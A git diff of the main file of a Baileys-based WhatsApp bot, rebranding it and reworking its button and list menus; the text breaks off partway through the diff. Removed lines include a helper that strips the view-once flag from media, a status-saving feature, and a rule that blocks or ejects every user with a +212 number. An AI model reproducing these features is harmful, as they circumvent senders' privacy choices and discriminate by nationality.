@@ -1,18 +1,12 @@
 const {
-    default: makeWASocket,
-    useMultiFileAuthState,
-    DisconnectReason,
-    getContentType,
-    fetchLatestBaileysVersion,
-    Browsers,
-    jidNormalizedUser,
-    generateForwardMessageContent,
-    generateWAMessageFromContent,
-    prepareWAMessageMedia,
-    proto
-    } = require('@whiskeysockets/baileys')
-
-const l = console.log
+default: makeWASocket,
+useMultiFileAuthState,
+DisconnectReason,
+jidNormalizedUser,
+getContentType,
+fetchLatestBaileysVersion,
+Browsers
+} = require('@whiskeysockets/baileys')
 const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
 const fs = require('fs')
 const P = require('pino')
@@ -23,7 +17,10 @@ const { sms,downloadMediaMessage } = require('./lib/msg')
 const axios = require('axios')
 const { File } = require('megajs')
 var { updateCMDStore, isbtnID, getCMDStore, getCmdForCmdId, connectdb, input, get, updb, updfb } = require("./lib/githubdb")
-const ownerNumber = ['94758315442']
+const prefix = '.'
+const l = console.log
+
+const ownerNumber = ['94702940582']
 
 //===================SESSION-AUTH============================
 if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
@@ -39,10 +36,14 @@ console.log("Session downloaded ✅")
 const express = require("express");
 const app = express();
 const port = process.env.PORT || 8000;
-//================================/
+
+//=============================================
+
 async function connectToWA() {
-console.log("Connecting ASITHA-MD 🧬...");
-const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/session/')
+await connectdb();
+await updb();
+console.log("Connecting wa bot 🧬...");
+const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/')
 var { version } = await fetchLatestBaileysVersion()
 
 const conn = makeWASocket({
@@ -54,7 +55,7 @@ const conn = makeWASocket({
         version
         })
     
-conn.ev.on('connection.update', async (update) => {
+conn.ev.on('connection.update', (update) => {
 const { connection, lastDisconnect } = update
 if (connection === 'close') {
 if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
@@ -69,70 +70,27 @@ require("./plugins/" + plugin);
 }
 });
 console.log('Plugins installed successful ✅')
-await connectdb();
-await updb();
 console.log('Bot connected to whatsapp ✅')
 
-let up = `*ASITHA-MD connected successful ✅`;
+let up = `Wa-BOT connected successful ✅\n\nPREFIX: ${prefix}`;
 
-await conn.sendMessage(ownerNumber + "@s.whatsapp.net", { image: { url: `https://i.postimg.cc/zvpdnfsK/1727229710389.jpg` }, caption: up })
+conn.sendMessage(ownerNumber + "@s.whatsapp.net", { image: { url: `https://telegra.ph/file/3f7249eb429c8211cbba3.jpg` }, caption: up })
 
 }
 })
-//==========================WELCOME && GOOD BYE==================================================
-
-    
-//==========================================================================
-
 conn.ev.on('creds.update', saveCreds)  
-    
-  conn.getstorednumrep = async (quotedid, jid, num,conn,mek) => { 
-  return await getstorednumrep(quotedid, jid, num,conn,mek);
-        };
 
 conn.ev.on('messages.upsert', async(mek) => {
-if (config.ALLWAYS_OFFLINE === "true" && mek.key && mek.key.remoteJid !== 'status@broadcast') {
-await conn.readMessages([mek.key]); // Mark the message as read but don't send delivery receipts
-}
 mek = mek.messages[0]
 if (!mek.message) return	
 mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
-if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true"){
-await conn.readMessages([mek.key])
-}
-const prefix = config.PREFIX;
+if (mek.key && mek.key.remoteJid === 'status@broadcast') return
 const m = sms(conn, mek)
 const type = getContentType(mek.message)
 const content = JSON.stringify(mek.message)
 const from = mek.key.remoteJid
 const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
-const quotedid = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.stanzaId || null : null
-           
-           let body;
-              if (type === 'conversation') {
-              body = mek.message.conversation;
-            } else if (type === 'extendedTextMessage') {
-                const storedNumRep = await getstorednumrep(quotedid, from, mek.message.extendedTextMessage.text, conn, mek) 
-              body = storedNumRep ? storedNumRep : mek.message.extendedTextMessage.text;
-              
-            } else if (type == 'interactiveResponseMessage' ) {
-              body = mek.message.interactiveResponseMessage  && mek.message.interactiveResponseMessage.nativeFlowResponseMessage && JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson) && JSON.parse(mek.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id;
-           
-            } else if (type == 'templateButtonReplyMessage' ) {
-              body = mek.message.templateButtonReplyMessage && mek.message.templateButtonReplyMessage.selectedId;
-              
-            } else if (type === 'extendedTextMessage') {
-              body = mek.message.extendedTextMessage.text;
-              
-            } else if  (type == 'imageMessage' && mek.message.imageMessage  && mek.message.imageMessage.caption) {
-              body = mek.message.imageMessage.caption;
-              
-            } else if (type == 'videoMessage' && mek.message.videoMessage && mek.message.videoMessage.caption) {
-              body = mek.message.videoMessage.caption 
-            } else {
-            body = '';
-            } 
-    
+const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
 const isCmd = body.startsWith(prefix)
 const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
 const args = body.trim().split(/ +/).slice(1)
@@ -151,147 +109,312 @@ const participants = isGroup ? await groupMetadata.participants : ''
 const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
 const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
 const isAdmins = isGroup ? groupAdmins.includes(sender) : false
-const isReact =m.message.reactionMessage ? true : false
+//======================================
+const isAnti = (teks) => {
+let getdata = teks
+for (let i=0;i<getdata.length;i++) {
+if(getdata[i] === from) return true
+}
+return false
+}
+//===========================================    
+}
 const reply = (teks) => {
 conn.sendMessage(from, { text: teks }, { quoted: mek })
 }
-conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
-            let vtype
-            if (options.readViewOnce) {
-                message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
-                vtype = Object.keys(message.message.viewOnceMessage.message)[0]
-                delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
-                delete message.message.viewOnceMessage.message[vtype].viewOnce
-                message.message = {
-                    ...message.message.viewOnceMessage.message
-                }
-            }
+//============================================
+conn.replyad = async (teks) => {
+  return await conn.sendMessage(from, { text: teks ,
+contextInfo: {
+    mentionedJid: [ '' ],
+    groupMentions: [],
+    forwardingScore: 1,
+    isForwarded: true,
+    forwardedNewsletterMessageInfo: {
+      newsletterJid: '120363182681793169@newsletter',
+      serverMessageId: 127
+    },
+externalAdReply: { 
+title: '🧚 ＱＵＥＥＮ -ＩＺＵＭＩ - ＭＤ 🧚',
+body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
+mediaType: 1,
+sourceUrl: "https://wa.me/94766943622" ,
+thumbnailUrl: 'https://telegra.ph/file/ba8ea739e63bf28c30b37.jpg' ,
+renderLargerThumbnail: false,
+showAdAttribution: true
+}
+}}, { quoted: mek })
+}
+const NON_BUTTON = true // Implement a switch to on/off this feature...
+conn.buttonMessage2 = async (jid, msgData,quotemek) => {
+  if (!NON_BUTTON) {
+    await conn.sendMessage(jid, msgData)
+  } else if (NON_BUTTON) {
+    let result = "";
+    const CMD_ID_MAP = []
+    msgData.buttons.forEach((button, bttnIndex) => {
+const mainNumber = `${bttnIndex + 1}`;
+result += `\n*${mainNumber} | ${button.buttonText.displayText}*\n`;
 
-            let mtype = Object.keys(message.message)[0]
-            let content = await generateForwardMessageContent(message, forceForward)
-            let ctype = Object.keys(content)[0]
-            let context = {}
-            if (mtype != "conversation") context = message.message[mtype].contextInfo
-            content[ctype].contextInfo = {
-                ...context,
-                ...content[ctype].contextInfo
-            }
-            const waMessage = await generateWAMessageFromContent(jid, content, options ? {
-                ...content[ctype],
-                ...options,
-                ...(options.contextInfo ? {
-                    contextInfo: {
-                        ...content[ctype].contextInfo,
-                        ...options.contextInfo
-                    }
-                } : {})
-            } : {})
-            await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
-            return waMessage
-             }
+CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
+    });
 
-  
-
-    
-    conn.sendButtonMessage = async (jid, buttons, quoted, opts = {}) => {
-    
-                    let header;
-                    if (opts?.video) {
-                        var video = await prepareWAMessageMedia({
-                            video: {
-                                url: opts && opts.video ? opts.video : ''
-                            }
-                        }, {
-                            upload: conn.waUploadToServer
-                        })
-                        header = {
-                            title: opts && opts.header ? opts.header : '',
-                            hasMediaAttachment: true,
-                            videoMessage: video.videoMessage,
-                        }
-    
-                    } else if (opts?.image) {
-                        var image = await prepareWAMessageMedia({
-                            image: {
-                                url: opts && opts.image ? opts.image : ''
-                            }
-                        }, {
-                            upload: conn.waUploadToServer
-                        })
-                        header = {
-                            title: opts && opts.header ? opts.header : '',
-                            hasMediaAttachment: true,
-                            imageMessage: image.imageMessage,
-                        }
-    
-                    } else {
-                        header = {
-                            title: opts && opts.header ? opts.header : '',
-                            hasMediaAttachment: false,
-                        }
-                    }
-    
-    
-                    let message = generateWAMessageFromContent(jid, {
-                        viewOnceMessage: {
-                            message: {
-                                messageContextInfo: {
-                                    deviceListMetadata: {},
-                                    deviceListMetadataVersion: 2,
-                                },
-                                interactiveMessage: {
-                                    body: {
-                                        text: opts && opts.body ? opts.body : ''
-                                    },
-                                    footer: {
-                                        text: opts && opts.footer ? opts.footer : ''
-                                    },
-                                    header: header,
-                                    nativeFlowMessage: {
-                                        buttons: buttons,
-                                        messageParamsJson: ''
-                                    },
-                contextInfo: {
-                      mentionedJid: [m.sender], 
-                      forwardingScore: 999,
-                      isForwarded: true,
-                    forwardedNewsletterMessageInfo: {
-                      newsletterJid: '120363314182963253@newsletter',
-                      newsletterName: "乡𝔸𝕊𝕀𝕋ℍ𝔸 𝕞𝕕 ࿐",
-                      serverMessageId: 1
-                    },
-                    externalAdReply: { 
-    title: '乡𝔸𝕊𝕀𝕋ℍ𝔸 𝕞𝕕 ࿐ｖ2',
-    body: 'ＰＯＷＥＲＤ ＢＹ ＡＳＩＴＨＡ ＭＤ',
-    mediaType: 1,
-    sourceUrl: "https://wa.me/94789123880",
-    thumbnailUrl: "https://i.postimg.cc/zvpdnfsK/1727229710389.jpg",
-    renderLargerThumbnail: false
-    
-                    }
-                               }
-                                }
-                            }
-                        }
-                    },{
-                        quoted: quoted
-                    })
-                    //await conn.sendPresenceUpdate('composing', jid)
-                    //await sleep(500 * 1);
-                    conn.relayMessage(jid, message["message"], {
-                        messageId: message.key.id
-                    })
+    if (msgData.headerType === 1) {
+const buttonMessage = `${msgData.text}\n\n🔢 Reply you want number,${result}\n${msgData.footer}`
+const textmsg = await conn.sendMessage(from, { text: buttonMessage ,
+  contextInfo: {
+    mentionedJid: [ '' ],
+    groupMentions: [],
+    forwardingScore: 1,
+    isForwarded: true,
+    forwardedNewsletterMessageInfo: {
+      newsletterJid: '120363182681793169@newsletter',
+      serverMessageId: 127
+    },
+externalAdReply: { 
+title: '🧚 ＱＵＥＥＮ -ＩＺＵＭＩ - ＭＤ 🧚',
+body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
+mediaType: 1,
+sourceUrl: "https://wa.me/94766943622" ,
+thumbnailUrl: 'https://telegra.ph/file/ba8ea739e63bf28c30b37.jpg' ,
+renderLargerThumbnail: false,
+showAdAttribution: true
+}
+}}, { quoted: quotemek || mek})
+await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
+    } else if (msgData.headerType === 4) {
+const buttonMessage = `${msgData.caption}\n\n🔢 Reply you want number,${result}\n${msgData.footer}`
+const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage ,
+contextInfo: {
+    mentionedJid: [ '' ],
+    groupMentions: [],
+    forwardingScore: 1,
+    isForwarded: true,
+    forwardedNewsletterMessageInfo: {
+      newsletterJid: '120363182681793169@newsletter',
+      serverMessageId: 127
+    },
+externalAdReply: { 
+title: '🧚 ＱＵＥＥＮ -ＩＺＵＭＩ - ＭＤ 🧚',
+body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
+mediaType: 1,
+sourceUrl: "https://wa.me/94766943622" ,
+thumbnailUrl: 'https://telegra.ph/file/ba8ea739e63bf28c30b37.jpg' ,
+renderLargerThumbnail: false,
+showAdAttribution: true
+}
+}}, { quoted: quotemek || mek})
+await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
     }
+  }
+}
+
+conn.replyList = async (from , list_reply , options) => {
+function convertNumberList(sections) {
+    let result = "";
+
+    sections.forEach((section, sectionIndex) => {
+        result += section.title? `*${section.title}*\n` : ''
+
+        section.rows.forEach((row, rowIndex) => {
+            result += `*${row.title} || ${row.description}*`;
+            result += rowIndex === section.rows.length - 1 ? "" : "\n"; // Add newline unless it's the last row
+        });
+
+        result += sectionIndex === sections.length - 1 ? "" : "\n\n"; // Add extra newline unless it's the last section
+    });
+
+    return result;
+}
+if (!list_reply.sections) return false
+list_reply[list_reply.caption? 'caption' : 'text'] = ( list_reply.title ? list_reply.title + '\n\n' : "" ) +  (list_reply.caption? list_reply.caption : list_reply.text) + '\n\n' + list_reply.buttonText + '\n\n' + await convertNumberList(list_reply.sections) + '\n\n' +list_reply.footer	
+var t = { ...list_reply }
+delete list_reply.sections
+delete list_reply.footer
+delete list_reply.buttonText
+delete list_reply.title
+const sentMessage = await conn.sendMessage(from, list_reply , options);	
+const cmdArray = [];
+t.sections.forEach((section) => {
+    section.rows.forEach((row) => {
+        cmdArray.push({ rowId: row.rowId, title: row.title });
+    });
+});
+for ( let i = 0; i < cmdArray.length; i++) {	
+await id_db.input_data(cmdArray[i].rowId ,cmdArray[i].title , sentMessage.key.id ) 
+}}  
+      
+conn.buttonMessage = async (jid, msgData, quotemek) => {
+  if (!NON_BUTTON) {
+    await conn.sendMessage(jid, msgData)
+  } else if (NON_BUTTON) {
+    let result = "";
+    const CMD_ID_MAP = []
+    msgData.buttons.forEach((button, bttnIndex) => {
+const mainNumber = `${bttnIndex + 1}`;
+result += `\n*${mainNumber} | ${button.buttonText.displayText}*\n`;
+
+CMD_ID_MAP.push({ cmdId: mainNumber, cmd: button.buttonId });
+    });
+
+    if (msgData.headerType === 1) {
+const buttonMessage = `${msgData.text || msgData.caption}\n🔢 Reply you want number,${result}\
+\n\n${msgData.footer}`
+const textmsg = await conn.sendMessage(from, { text: buttonMessage ,contextInfo: {
+    mentionedJid: [ '' ],
+    groupMentions: [],
+    forwardingScore: 1,
+    isForwarded: true,
+    forwardedNewsletterMessageInfo: {
+      newsletterJid: '120363182681793169@newsletter',
+      serverMessageId: 127
+    },
+externalAdReply: { 
+title: '🧚 ＱＵＥＥＮ -ＩＺＵＭＩ - ＭＤ 🧚',
+body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
+mediaType: 1,
+sourceUrl: "https://wa.me/94766943622" ,
+thumbnailUrl: 'https://telegra.ph/file/ba8ea739e63bf28c30b37.jpg' ,
+renderLargerThumbnail: false,
+showAdAttribution: true
+}
+}}, { quoted: quotemek || mek})
+await updateCMDStore(textmsg.key.id, CMD_ID_MAP);
+    } else if (msgData.headerType === 4) {
+const buttonMessage = `${msgData.caption}\n\n🔢 Reply you want number,${result}\n${msgData.footer}`
+const imgmsg = await conn.sendMessage(jid, { image: msgData.image, caption: buttonMessage ,contextInfo: {
+    mentionedJid: [ '' ],
+    groupMentions: [],
+    forwardingScore: 1,
+    isForwarded: true,
+    forwardedNewsletterMessageInfo: {
+      newsletterJid: '120363182681793169@newsletter',
+      serverMessageId: 127
+    },
+externalAdReply: { 
+title: '🧚 ＱＵＥＥＮ -ＩＺＵＭＩ - ＭＤ 🧚',
+body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
+mediaType: 1,
+sourceUrl: "https://wa.me/94766943622" ,
+thumbnailUrl: 'https://telegra.ph/file/ba8ea739e63bf28c30b37.jpg' ,
+renderLargerThumbnail: false,
+showAdAttribution: true
+}
+}}, { quoted: quotemek || mek})
+await updateCMDStore(imgmsg.key.id, CMD_ID_MAP);
+    }
+  }
+}
 
 
-            conn.storenumrepdata = async (json) => {
-            return await storenumrepdata(json);
-            };      
+conn.listMessage2 = async (jid, msgData, quotemek) => {
+  if (!NON_BUTTON) {
+    await conn.sendMessage(jid, msgData)
+  } else if (NON_BUTTON) {
+    let result = "";
+    const CMD_ID_MAP = []
 
-            const sendmsg = (teks) => {
-            return conn.sendMessage(from, { text: teks } );
-            }     
+    msgData.sections.forEach((section, sectionIndex) => {
+const mainNumber = `${sectionIndex + 1}`;
+result += `\n*[${mainNumber}] ${section.title}*\n`;
 
+section.rows.forEach((row, rowIndex) => {
+  const subNumber = `${mainNumber}.${rowIndex + 1}`;
+  const rowHeader = `   ${subNumber} | ${row.title}`;
+  result += `${rowHeader}\n`;
+  if (row.description) {
+    result += `   ${row.description}\n\n`;
+  }
+  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
+});
+    });
+
+    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n${msgData.footer}`
+    const text = await conn.sendMessage(from, { text: listMessage ,
+contextInfo: {
+    mentionedJid: [ '' ],
+    groupMentions: [],
+    forwardingScore: 1,
+    isForwarded: true,
+    forwardedNewsletterMessageInfo: {
+      newsletterJid: '120363182681793169@newsletter',
+      serverMessageId: 127
+    },
+externalAdReply: { 
+title: '🧚 ＱＵＥＥＮ -ＩＺＵＭＩ - ＭＤ 🧚',
+body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
+mediaType: 1,
+sourceUrl: "https://wa.me/94766943622" ,
+thumbnailUrl: 'https://raw.githubusercontent.com/vihangayt0/ZeroTwo-Uploads/main/bbb61bc283cc1891a9a3c.jpg' ,
+renderLargerThumbnail: false,
+showAdAttribution: true
+}
+}}, { quoted: quotemek || mek})
+    await updateCMDStore(text.key.id, CMD_ID_MAP);
+  }
+}
+
+conn.listMessage = async (jid, msgData, quotemek) => {
+  if (!NON_BUTTON) {
+    await conn.sendMessage(jid, msgData)
+  } else if (NON_BUTTON) {
+    let result = "";
+    const CMD_ID_MAP = []
+
+    msgData.sections.forEach((section, sectionIndex) => {
+const mainNumber = `${sectionIndex + 1}`;
+result += `\n*[${mainNumber}] ${section.title}*\n`;
+
+section.rows.forEach((row, rowIndex) => {
+  const subNumber = `${mainNumber}.${rowIndex + 1}`;
+  const rowHeader = `   ${subNumber} | ${row.title}`;
+  result += `${rowHeader}\n`;
+  if (row.description) {
+    result += `   ${row.description}\n\n`;
+  }
+  CMD_ID_MAP.push({ cmdId: subNumber, cmd: row.rowId });
+});
+    });
+
+    const listMessage = `${msgData.text}\n\n${msgData.buttonText},${result}\n${msgData.footer}`
+    const text = await conn.sendMessage(from, { text: listMessage, 
+contextInfo: {
+    mentionedJid: [ '' ],
+    groupMentions: [],
+    forwardingScore: 1,
+    isForwarded: true,
+    forwardedNewsletterMessageInfo: {
+      newsletterJid: '120363182681793169@newsletter',
+      serverMessageId: 127
+    },
+externalAdReply: { 
+title: '🧚 ＱＵＥＥＮ -ＩＺＵＭＩ - ＭＤ 🧚',
+body: 'ᴀ ꜱɪᴍᴘʟᴇ ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ',
+mediaType: 1,
+sourceUrl: "https://wa.me/94766943622" ,
+thumbnailUrl: 'https://telegra.ph/file/ba8ea739e63bf28c30b37.jpg' ,
+renderLargerThumbnail: false,
+showAdAttribution: true
+}
+}}, { quoted: quotemek || mek})
+    await updateCMDStore(text.key.id, CMD_ID_MAP);
+  }
+}
+
+conn.edite = async (gg, newmg) => {
+  await conn.relayMessage(from, {
+    protocolMessage: {
+key: gg.key,
+type: 14,
+editedMessage: {
+  conversation: newmg
+}
+    }
+  }, {})
+}
+ 
+//=================================================================================
+        
 conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
               let mime = '';
               let res = await axios.head(url)
@@ -313,311 +436,172 @@ conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
                 return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
               }
             }
-if(senderNumber.includes("94789123880")){
-if(isReact) return
-m.react("🧑‍💻")
+
+if (config.ONLY_GROUP && !isMe && !isGroup) return
+if(from === "120363348744137338@g.us" && !isdev) return
+const events = require('./command')
+const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
+if (isCmd) {
+const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
+if (cmd) {
+if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
+
+try {
+cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
+} catch (e) {
+console.error("[PLUGIN ERROR] " + e);
 }
-if(senderNumber.includes("94743381623")){
-if(isReact) return
-m.react("👾")
 }
-//read commands
-if (isCmd && config.READ_CMD === "true" && config.ALLWAYS_OFFLINE === "false") {
-await conn.readMessages([mek.key])  // Mark command as read
 }
-//==============band user======((((((
-const banbn = await fetchJson(`https://raw.githubusercontent.com/athulakumara604/ASITHA-MD-DATABASE/refs/heads/main/Banduser.json`)
-const plynYnna = banbn.split(",")
-const isBanUser = [ ...plynYnna ]
-      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
-      .includes(sender)
-
-const isCreator = ["94743381623,94714857323"]
-      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
-      .includes(sender)    
- 
-//================================WORK TYPE============================================ 
-if(!isOwner && isCreator && config.MODE === "private") return 
-if(!isOwner && isCreator && isGroup && config.MODE === "inbox") return 
-if(!isOwner && isCreator && !isGroup && config.MODE === "groups") return 
-
-if ( isCmd && isBanUser ) return reply("❌ *You are banned from using Commands.....*\n\n*_Please contact ASITHA-MD Bot Owner <94743381623> Remove your Ban_* 👨‍🔧\n")
-//=====================================================================================
-    //==================================plugin map================================
-            const events = require('./command')
-            const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
-            if (isCmd) {
-                const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
-                if (cmd) {
-                    if (cmd.react) conn.sendMessage(from, {
-                        react: {
-                            text: cmd.react,
-                            key: mek.key
-                        }
-                    })
-
-                    try {
-                        cmd.function(conn, mek, m, {
-                            from,
-                            prefix,
-                            quoted,
-                            body,
-                            command,
-                            args,
-                            q,
-                            isGroup,
-                            sender,
-                            senderNumber,
-                            botNumber2,
-                            botNumber,
-                            pushname,
-                            isMe,
-                            isOwner,
-                            groupMetadata,
-                            groupName,
-                            participants,
-                            groupAdmins,
-                            isBotAdmins,
-                            isAdmins,
-                            reply
-                        });
-                    } catch (e) {
-                        console.error("[PLUGIN ERROR] ", e);
-                    }
-                }
-            }
-            events.commands.map(async (command) => {
-                if (body && command.on === "body") {
-                    command.function(conn, mek, m, {
-                        from,
-                        prefix,
-                        quoted,
-                        body,
-                        command,
-                        args,
-                        q,
-                        isGroup,
-                        sender,
-                        senderNumber,
-                        botNumber2,
-                        botNumber,
-                        pushname,
-                        isMe,
-                        isOwner,
-                        groupMetadata,
-                        groupName,
-                        participants,
-                        groupAdmins,
-                        isBotAdmins,
-                        isAdmins,
-                        reply
-                    })
-                } else if (mek.q && command.on === "text") {
-                    command.function(conn, mek, m, {
-                        from,
-                        prefix,
-                        quoted,
-                        body,
-                        command,
-                        args,
-                        q,
-                        isGroup,
-                        sender,
-                        senderNumber,
-                        botNumber2,
-                        botNumber,
-                        pushname,
-                        isMe,
-                        isOwner,
-                        groupMetadata,
-                        groupName,
-                        participants,
-                        groupAdmins,
-                        isBotAdmins,
-                        isAdmins,
-                        reply
-                    })
-                } else if (
-                    (command.on === "image" || command.on === "photo") &&
-                    mek.type === "imageMessage"
-                ) {
-                    command.function(conn, mek, m, {
-                        from,
-                        prefix,
-                        quoted,
-                        body,
-                        command,
-                        args,
-                        q,
-                        isGroup,
-                        sender,
-                        senderNumber,
-                        botNumber2,
-                        botNumber,
-                        pushname,
-                        isMe,
-                        isOwner,
-                        groupMetadata,
-                        groupName,
-                        participants,
-                        groupAdmins,
-                        isBotAdmins,
-                        isAdmins,
-                        reply
-                    })
-                } else if (
-                    command.on === "sticker" &&
-                    mek.type === "stickerMessage"
-                ) {
-                    command.function(conn, mek, m, {
-                        from,
-                        prefix,
-                        quoted,
-                        body,
-                        command,
-                        args,
-                        q,
-                        isGroup,
-                        sender,
-                        senderNumber,
-                        botNumber2,
-                        botNumber,
-                        pushname,
-                        isMe,
-                        isOwner,
-                        groupMetadata,
-                        groupName,
-                        participants,
-                        groupAdmins,
-                        isBotAdmins,
-                        isAdmins,
-                        reply
-                    })
-                }
-            });
-    //============================================================================ 
-        
-
-if(body === "send" || body === "Send" || body === "Seve" || body === "Ewpm" || body === "ewpn" || body === "Dapan" || body === "dapan" || body === "oni" || body === "Oni" || body === "save" || body === "Save" || body === "ewanna" || body === "Ewanna" || body === "ewam" || body === "Ewam" || body === "sv" || body === "Sv"|| body === "දාන්න"|| body === "එවම්න"){
-    // if(!m.quoted) return reply("*Please Mention status*")
-    const data = JSON.stringify(mek.message, null, 2);
-    const jsonData = JSON.parse(data);
-    const isStatus = jsonData.extendedTextMessage.contextInfo.remoteJid;
-    if(!isStatus) return
-
-    const getExtension = (buffer) => {
-        const magicNumbers = {
-            jpg: 'ffd8ffe0',
-            png: '89504e47',
-            mp4: '00000018',
-        };
-        const magic = buffer.toString('hex', 0, 4);
-        return Object.keys(magicNumbers).find(key => magicNumbers[key] === magic);
-    };
-
-    if(m.quoted.type === 'imageMessage') {
-        var nameJpg = getRandom('');
-        let buff = await m.quoted.download(nameJpg);
-        let ext = getExtension(buff);
-        await fs.promises.writeFile("./" + ext, buff);
-        const caption = m.quoted.imageMessage.caption;
-        await conn.sendMessage(from, { image: fs.readFileSync("./" + ext), caption: caption });
-    } else if(m.quoted.type === 'videoMessage') {
-        var nameJpg = getRandom('');
-        let buff = await m.quoted.download(nameJpg);
-        let ext = getExtension(buff);
-        await fs.promises.writeFile("./" + ext, buff);
-        const caption = m.quoted.videoMessage.caption;
-        let buttonMessage = {
-            video: fs.readFileSync("./" + ext),
-            mimetype: "video/mp4",
-            fileName: `${m.id}.mp4`,
-            caption: caption ,
-            headerType: 4
-        };
-        await conn.sendMessage(from, buttonMessage,{
-            quoted: mek
-        });
-    }
-}
-
-  //======================================================================
-       if (config.ALLWAYS_OFFLINE === "true") {
-        conn.sendPresenceUpdate('unavailable'); // Sets the bot's last seen status
-    }
-
-    if (senderNumber.startsWith('212') && config.BAD_NO_BLOCK === "true") {
-        console.log(`Blocking number +212${senderNumber.slice(3)}...`);
-
-        // Action: Either block the user or remove them from a group
-        if (from.endsWith('@g.us')) {
-            // If in a group, remove the user
-            await conn.groupParticipantsUpdate(from, [sender], 'remove');
-            await conn.sendMessage(from, { text: 'User with +212 number detected and removed from the group.' });
-        } else {
-            // If in a private chat, block the user
-            await conn.updateBlockStatus(sender, 'block');
-            console.log(`Blocked +212${senderNumber.slice(3)} successfully.`);
-        }
-
-        return; // Stop further processing of this message
-    }
-
-    if (config.ANTI_LINK == "true"){
-        if (!isOwner && isGroup && isBotAdmins ) {   
-        if (body.match(`chat.whatsapp.com`)) {
-            
-        if (isMe) return await reply("Link Derect but i can't Delete link")
-        if(groupAdmins.includes(sender)) return
-            
-        await conn.sendMessage(from, { delete: mek.key })  
-        }}}
-
-    
-const bad = await fetchJson(`https://raw.githubusercontent.com/KING-RASHMIKA/AutoFunction/refs/heads/main/bad_words.json`)
-if (config.ANTI_BAD == "true"){
-  if (!isAdmins && !isMe) {
-  for (any in bad){
-  if (body.toLowerCase().includes(bad[any])){  
-    if (!body.includes('tent')) {
-      if (!body.includes('docu')) {
-        if (!body.includes('https')) {
-  if (groupAdmins.includes(sender)) return 
-  if (mek.key.fromMe) return   
-  await conn.sendMessage(from, { delete: mek.key })  
-  await conn.sendMessage(from , { text: '*Bad word detected..!*'})
-//  await conn.groupParticipantsUpdate(from,[sender], 'remove')
-  }}}}}}}
-  
- if (config.ANTI_BOT == "true"){
-  if ( isGroup && !isAdmins && !isMe && !isOwner && isBotAdmins ) {
-  if ( mek.id.startsWith("BAE") ) {
-await conn.sendMessage(from, { text: "❌ ```Another Bot's message Detected :``` 📚 *Removed By ASITHA MD* ❗\nAnti Bot System on..." })
-if ( config.ANTI_BOT == "true" && isBotAdmins ) {
-await conn.sendMessage(from, { delete: mek.key })
-await conn.groupParticipantsUpdate(from,[sender], 'remove')
-  }}
-    if ( mek.id.startsWith("QUEENAMDI") ) {
-await conn.sendMessage(from, { text: "❌ ```Another Bot's message Detected :``` *💃 ASITHA MD* ❗\n*Removed By ASITHA MD* ❗\nAnti Bot System on..." })
